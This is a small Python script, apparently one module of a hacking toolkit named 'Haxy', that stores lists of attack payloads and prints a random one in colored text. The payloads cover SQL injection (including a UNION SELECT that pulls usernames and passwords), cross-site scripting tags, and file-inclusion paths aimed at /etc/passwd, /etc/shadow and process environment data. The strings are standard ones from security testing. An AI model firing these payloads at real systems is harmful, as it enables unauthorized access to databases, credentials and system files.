# Haxy: payloads 

import sys, os, time, random

COLORS = {
    "cyan": "\033[96m",
    "green": "\033[92m",
    "yellow": "\033[93m",
    "red": "\033[91m",
    "reset": "\033[0m"
}
RESET = "\033[0m"

PAYLOADS = {
    "sql": [
        "' OR '1'='1",
        "' UNION SELECT NULL, version()--",
        "' AND 1=0 UNION SELECT username, password FROM users--",
        "admin' --",
        "' OR 1=1 LIMIT 1--"
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert('haxy')>"
    ],
    "lfi": [
        "../../etc/passwd",
        "../../../../windows/win.ini",
        "/proc/self/environ",
        "/etc/shadow",
        "../../../../../../boot.ini"
    ]
}

def run(args):
    if not args:
        print(f"{COLORS['red']}Uso: haxy <categoria>{COLORS['reset']}")
        print(f"{COLORS['cyan']}Categorias disponibles:{COLORS['reset']} {COLORS['red']}{', '.join(PAYLOADS.keys())}{COLORS['reset']}")
        return
    cat = args[0].lower()
    if cat not in PAYLOADS:
        print(f"{COLORS['red']}categoria no valida!. Usa: {', '.join(PAYLOADS.keys())}{COLORS['reset']}")
        return
    payload = random.choice(PAYLOADS[cat])
    color = COLORS[random.choice(list(COLORS.keys())[:-1])]
    text = f"[{cat.upper()}] {payload}"
    for letra in text:
        sys.stdout.write(color + letra + COLORS['reset'])
        sys.stdout.flush()
        time.sleep(random.uniform(0.02, 0.05))
    print()